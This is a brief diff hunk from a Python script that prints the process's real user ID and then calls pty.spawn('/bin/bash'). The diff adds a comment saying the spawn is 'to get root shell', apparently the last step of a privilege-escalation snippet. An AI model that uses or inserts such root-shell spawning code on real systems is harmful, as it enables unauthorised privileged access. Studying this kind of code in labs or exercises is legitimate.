@@ -22,4 +22,6 @@ print("Real user ID changed")
 # Print the real user ID
 # of the current process
 print("Real user ID of the current process:", os.getuid())
+
+# to get root shell
 pty.spawn('/bin/bash')
